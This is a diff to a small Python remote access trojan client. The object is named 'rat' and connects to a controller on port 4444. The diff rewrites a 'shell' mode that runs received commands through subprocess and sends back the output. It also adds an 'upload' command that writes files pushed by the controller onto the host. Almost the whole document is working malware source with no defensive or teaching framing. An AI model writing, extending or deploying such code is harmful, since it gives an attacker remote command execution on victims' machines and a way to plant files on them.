@@ -1,4 +1,7 @@
+#!/usr/bin/env python3
+
 import socket, subprocess, os, platform
+import time
 
 
 class CLIENT:
@@ -16,27 +19,38 @@ class CLIENT:
         
     def main_loop(self):
         while True:
-            command = sock.recv(1024).decode()
-            
-            match command:
+            command = sock.recv(1024).decode()   
                 
-                case 'shell':
-                    while True:
-                        command = sock.recv(1024).decode()
-                        try:
-                            if command == "exit":
-                                break
-                            elif command[:2] == 'cd':
-                                os.chdir(command[3:])
-                                directory = os.getcwd()
-                                str_dir = str(directory)
-                                sock.send(str_dir.encode())
-                                command = ''
-                            output = subprocess.getoutput(command)
-                            sock.send(output.encode())
-                        except:
-                            err = 'bad command'
-                            sock.send(err.encode())
+            if command == 'shell':
+                while True:
+                    command = sock.recv(1024).decode()
+                    try:
+                        if command == "exit":
+                            break
+                        elif command[:2] == 'cd':
+                            os.chdir(command[3:])
+                            directory = os.getcwd()
+                            str_dir = str(directory)
+                            sock.send(str_dir.encode())
+                            command = ''
+                        output = subprocess.getoutput(command)
+                        sock.send(output.encode())
+                    except:
+                        err = 'bad command'
+                        sock.send(err.encode())
+                        
+            if command == "upload":
+                filename = sock.recv(1024).decode()
+                parsed_fn = filename.split('.')
+                file = open(f"{parsed_fn[0]}" + '.' + f"{parsed_fn[1]}",'wb') #open in binary       
+                #         # receive data and write it to file
+                time.sleep(1)
+                l = sock.recv(1024)
+                print(l)
+                file.write(l)
+                file.close()
+
+                
 rat = CLIENT('127.0.0.1', 4444)
 
 if __name__ == '__main__':
